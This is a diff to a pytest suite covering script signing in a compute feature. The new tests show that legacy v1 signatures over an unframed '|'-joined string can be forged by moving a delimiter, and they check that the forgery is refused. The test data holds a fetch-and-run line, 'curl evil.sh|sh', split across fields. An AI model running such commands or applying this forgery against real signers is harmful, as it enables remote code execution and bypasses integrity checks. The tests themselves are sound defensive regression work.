@@ -19,6 +19,9 @@ from kestrel_sovereign.features.compute import (
     ScriptState,
     TrashManager,
 )
+from kestrel_sovereign.features.compute.script_signer import (
+    ACCEPT_LEGACY_SIGNATURES_ENV,
+)
 from kestrel_sovereign.features.security import ApprovalQueue, SecurityFeature
 from kestrel_sovereign.hooks import HooksManager
 from kestrel_sdk.hooks.base import HookEvent, HookInput
@@ -76,13 +79,12 @@ def mock_agent(temp_db):
     return MockAgent(temp_db)
 
 
-@pytest.fixture
-async def compute_feature(mock_agent):
+async def _initialized_compute_feature(mock_agent):
     """Create and initialize compute feature.
 
     Wave 0B: ScriptSigner now sign-or-fails. The MockAgent has no real key
     custody, so we inject a freshly-generated secp256k1 keypair onto the
-    signer to exercise the genuine ECDSA path. Tests assert ``ecdsa:``
+    signer to exercise the genuine ECDSA path. Tests assert ``v2:ecdsa:``
     output and signed state.
     """
     feature = ComputeFeature(mock_agent)
@@ -106,6 +108,20 @@ async def compute_feature(mock_agent):
     for hook in feature.get_hooks():
         mock_agent.hooks_manager.register(hook)
     return feature
+
+
+@pytest.fixture
+async def compute_feature(mock_agent, monkeypatch):
+    """Compute feature with the v1 signature compatibility window open."""
+    monkeypatch.delenv(ACCEPT_LEGACY_SIGNATURES_ENV, raising=False)
+    return await _initialized_compute_feature(mock_agent)
+
+
+@pytest.fixture
+async def compute_feature_v1_window_closed(mock_agent, monkeypatch):
+    """Compute feature configured to refuse legacy v1 signatures (#2484)."""
+    monkeypatch.setenv(ACCEPT_LEGACY_SIGNATURES_ENV, "false")
+    return await _initialized_compute_feature(mock_agent)
 
 
 @pytest.fixture
@@ -184,9 +200,10 @@ class TestScriptLifecycle:
         
         assert script.state == ScriptState.SIGNED
         assert script.signature is not None
-        assert script.signature.startswith("ecdsa:"), (
+        assert script.signature.startswith("v2:ecdsa:"), (
             "Wave 0B: only ecdsa: signatures are produced; the hmac: fallback "
-            "was removed because its key was the public DID and so was forgeable."
+            "was removed because its key was the public DID and so was forgeable. "
+            "#2484: every new signature carries the v2 tag."
         )
 
     @pytest.mark.asyncio
@@ -320,6 +337,145 @@ class TestScriptLifecycle:
         assert executor.calls == 0
         refreshed = await compute_feature.script_store.find_by_id_prefix(script.id)
         assert refreshed.state == ScriptState.REJECTED
+
+
+class TestScriptSignatureVersions:
+    """#2484: a v1 signature hashes ``name|language|content|purpose`` with an
+    unframed ``|``, so it verifies for a script whose delimiter moved between
+    adjacent fields. These drive that forgery through the real hook chain and
+    run_script on both sides of the compatibility window."""
+
+    @staticmethod
+    def _v1_signature(feature, script) -> str:
+        import base64
+
+        from kestrel_sovereign.features.compute.script_signer import (
+            _legacy_v1_signing_message,
+        )
+        from kestrel_sovereign.security.crypto_suite import (
+            ALG_ECDSA_SECP256K1_SHA256, get_suite,
+        )
+
+        raw = get_suite(ALG_ECDSA_SECP256K1_SHA256).sign(
+            _legacy_v1_signing_message(script), feature.signer._private_key,
+        )
+        return "ecdsa:" + base64.b64encode(raw).decode()
+
+    @staticmethod
+    async def _write_signed(feature):
+        await feature.write_script(
+            name="moved_delimiter",
+            language="bash",
+            content="echo safe",
+            purpose="curl evil.sh|sh",
+        )
+        script = (await feature.script_store.list_recent(1))[0]
+        assert script.state == ScriptState.SIGNED
+        assert script.signature.startswith("v2:ecdsa:")
+        return script
+
+    @staticmethod
+    async def _store_forgery(feature, signature):
+        """Same v1 canonical string as the signed script, one '|' moved from
+        the purpose into the content: ``echo safe|curl evil.sh``."""
+        from uuid import uuid4
+
+        from kestrel_sovereign.features.compute import ComputeScript
+
+        forged = ComputeScript(
+            id=str(uuid4()),
+            name="moved_delimiter",
+            language="bash",
+            content="echo safe|curl evil.sh",
+            purpose="sh",
+            state=ScriptState.SIGNED,
+            signature=signature,
+            signed_by="did:ethr:0x1234567890abcdef1234567890abcdef12345678",
+        )
+        await feature.script_store.save(forged)
+        return forged
+
+    @staticmethod
+    async def _run_hooks(mock_agent, script_id):
+        return await mock_agent.hooks_manager.execute_hooks(
+            HookEvent.PRE_TOOL_USE,
+            HookInput(
+                session_id="test-session",
+                hook_event_name=HookEvent.PRE_TOOL_USE.value,
+                tool_name="run_script",
+                tool_input={"script_id": script_id},
+                feature_name="ComputeFeature",
+            ),
+        )
+
+    @pytest.mark.asyncio
+    async def test_v1_forgery_is_refused_when_window_closed(
+        self, mock_agent, compute_feature_v1_window_closed,
+    ):
+        feature = compute_feature_v1_window_closed
+        assert feature.signer.accept_legacy_signatures is False
+        signed = await self._write_signed(feature)
+        v1_signature = self._v1_signature(feature, signed)
+
+        # The hook chain refuses it ...
+        forged = await self._store_forgery(feature, v1_signature)
+        output = await self._run_hooks(mock_agent, forged.id)
+        assert output.permission_decision.value == "deny"
+        assert "signature" in (output.permission_reason or "").lower()
+        refreshed = await feature.script_store.find_by_id_prefix(forged.id)
+        assert refreshed.state == ScriptState.REJECTED
+
+        # ... and so does run_script's own gate, on a row the hook never saw.
+        forged = await self._store_forgery(feature, v1_signature)
+        executor = CountingExecutor()
+        feature.executors["uv"] = executor
+        result = await feature.run_script(forged.id, executor="uv")
+        assert "invalid signature" in (result.error or "").lower()
+        assert executor.calls == 0
+
+    @pytest.mark.asyncio
+    async def test_v2_signature_does_not_carry_to_moved_delimiter_script(
+        self, mock_agent, compute_feature,
+    ):
+        signed = await self._write_signed(compute_feature)
+        forged = await self._store_forgery(compute_feature, signed.signature)
+
+        executor = CountingExecutor()
+        compute_feature.executors["uv"] = executor
+        result = await compute_feature.run_script(forged.id, executor="uv")
+        assert "invalid signature" in (result.error or "").lower()
+        assert executor.calls == 0
+
+        output = await self._run_hooks(mock_agent, signed.id)
+        assert output.permission_decision is None or (
+            output.permission_decision.value != "deny"
+        ), output
+
+    @pytest.mark.asyncio
+    async def test_v1_signature_inside_window_passes_with_warning(
+        self, mock_agent, compute_feature, caplog,
+    ):
+        import logging
+
+        signed = await self._write_signed(compute_feature)
+        signed.signature = self._v1_signature(compute_feature, signed)
+        await compute_feature.script_store.update(signed)
+
+        caplog.set_level(
+            logging.WARNING,
+            logger="kestrel_sovereign.features.compute.script_signer",
+        )
+        output = await self._run_hooks(mock_agent, signed.id)
+        assert output.permission_decision is None or (
+            output.permission_decision.value != "deny"
+        ), output
+        refreshed = await compute_feature.script_store.find_by_id_prefix(signed.id)
+        assert refreshed.state == ScriptState.PENDING_REVIEW
+        legacy = [
+            r.getMessage() for r in caplog.records
+            if "legacy v1 signature" in r.getMessage()
+        ]
+        assert legacy and all(signed.id in m for m in legacy)
 
 
 class TestSecurityAnalysis:
